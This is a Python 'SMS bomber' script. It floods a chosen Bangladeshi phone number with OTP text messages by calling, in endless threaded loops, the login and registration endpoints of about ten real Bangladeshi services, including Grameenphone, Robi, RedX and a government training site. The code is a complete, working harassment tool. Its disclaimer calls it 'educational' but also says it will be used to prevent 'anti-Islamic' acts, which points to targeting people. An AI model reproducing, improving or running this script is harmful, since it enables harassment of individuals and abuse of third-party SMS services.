import os
import time
import threading
import requests

#set password

PASSWORD = "parrot" 

    #Banner and disclaimer start

def banner():
    import os
    os.system("clear")
    print("\033[1;31m")
    print(r"""
    
    
    
    
    
                SMS BOMBER TOOL - DISCLAIMER
---------------------------------------------------------------------------

This SMS Bomber tool is created **strictly for educational purposes**, cybersecurity 
research, and testing of your own systems or services.

By using this tool, you agree to the following:

1. You will **NOT** use this tool to harass, spam, annoy, or attack any individual.  
2. You will **NOT** use it against any phone number without **explicit permission**.  
3. You understand that sending unsolicited or mass messages may violate  
   national **cyber laws**, **privacy laws**, and **telecommunication regulations**.  
4. The developer, publisher, or distributor of this tool is **NOT responsible**
   for any misuse, damage, loss, or legal consequences caused by users.

Any unauthorized or malicious use of this tool is **illegal** and may lead to 
criminal charges.

Use responsibly.  
You are solely responsible for your actions.

This will be used solely for the purpose of preventing actions that go against Islam.
এটি কেবলমাত্র ইসলামবিরোধী কাজ প্রতিরোধের উদ্দেশ্যে ব্যবহৃত হবে । 
__________________________________________________

"আমি এই টুলসটি কোনো খারাপ, ক্ষতিকর বা অবৈধ কাজে ব্যবহার করবো না—এই মর্মে আমি স্বেচ্ছায় সাক্ষ্য প্রদান করছি। টুলসটি রান করার মাধ্যমে আমি ঘোষণা করছি যে, আমি এই টুলস ব্যবহারের সকল শর্ত, নিয়ম ও নীতিমালা সম্পূর্ণভাবে মেনে নিয়েছি।”

English:
"I voluntarily affirm that I will not use this tool for any harmful, malicious, or illegal activities. By running this tool, I acknowledge and confirm that I fully accept and comply with all terms, rules, and conditions associated with its use."


----------------------------------------------------------------------------
Sheikh Ajim Bin Nazir
Telegram : https://t.me/islamiccybernetwork
password is : parrot
-----------------------------------------------------------------------------
    
    
    
    
    
    
    """)
    

    print("\033[0m")
    
     #Banner and disclaimer close
       

def password_prompt():
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    pw = input("Enter password: ")
    print("\033[1;32m[+]  Password Checking..... \033[0m")
    time.sleep(2)
    if pw != PASSWORD:
        print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
        exit()
    
    print("\033[1;32m[+]  Verification Successful. Loading modules... \033[0m")
    time.sleep(2)
#option setup
def menu():
    banner()
    print("\n\033[1;35m[1] START ATTACK \n[2] Exit\033[0m")
    choice = input("Select option‌ 1/2 : ")
    if choice == "1":
        start_bombing()
    else:
        print("\033[1;31m[-] Exiting...\033[0m")
        exit()
#target setup
def get_target():
    number = input("Enter Bangladeshi phone number (01********): ")
    if number.startswith("01") and len(number) == 11:
        return number, "880" + number[1:]
    else:
        print("\033[1;31m[!]Invalid number format ⚠️.  Enter only bangladeshi number no country code.\033[0m")
        exit()

counter = 0
lock = threading.Lock()

def update_counter():
    global counter
    with lock:
        counter += 1
        print(f"\033[1;32m[+] Request successfully executed  | Status: SUCCESS : {counter}\033[0m")

def fast_apis(phone, full):
    try:
        requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0")
        update_counter()
    except: pass

    try:
        requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}")
        update_counter()
    except: pass

def normal_apis(phone, full):
    apis = [
        ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
        ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {"phone": phone}),
        ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
        ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
        ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
        ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
        ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
        ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
    ]

    for url, data in apis:
        try:
            requests.post(url, json=data)
            update_counter()
        except: pass

def start_bombing():
    phone, full = get_target()
    while True:
        threads = []

        for _ in range(3):
            t = threading.Thread(target=fast_apis, args=(phone, full))
            t.start()
            threads.append(t)

        t = threading.Thread(target=normal_apis, args=(phone, full))
        t.start()
        threads.append(t)

        for t in threads:
            t.join()
        time.sleep(1)

if __name__ == "__main__":
    banner()
    password_prompt()
    menu()


# শিক্ষা মূলক উদ্দেশ্য তৈরি
